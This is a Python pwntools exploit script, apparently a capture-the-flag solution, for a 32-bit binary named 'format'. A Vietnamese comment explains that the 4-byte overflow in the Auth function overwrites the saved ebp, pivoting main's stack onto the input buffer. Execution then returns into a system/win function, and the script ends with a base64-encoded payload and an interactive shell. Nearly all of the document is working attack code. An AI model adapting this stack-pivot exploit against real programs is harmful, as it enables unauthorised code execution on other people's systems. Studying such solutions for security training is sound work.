from pwn import *
import base64

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x08049397
b* 0x080492ba
b* 0x0804930c
continue
'''.format(**locals())

#Binary filename
exe = './format'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

'''
Bof tai ham Auth va t chi co 4 byte -> khong the ghi de ham return tren Auth
nhung ta co the ghi de ebp vi ebp tren Auth luu tru vi tri ebp cua ham main
Khi return thi ham main se thuc hien 2 hanh dong:
(mov esp, ebp; pop ebp) sau do se la return
nhu vay de ghi de thanh cong de main chay den win thi ta can luu vi tri input 
addr va addr + 4 la dia chi ham win system
'''


system_addr = 0x08049284
input_addr = 0x0811eb40

p.recvuntil(b"Authenticate : ")
payload = (b"a" *4 + p32(system_addr) + p32(input_addr))
p.sendline(base64.b64encode(payload))

p.interactive()
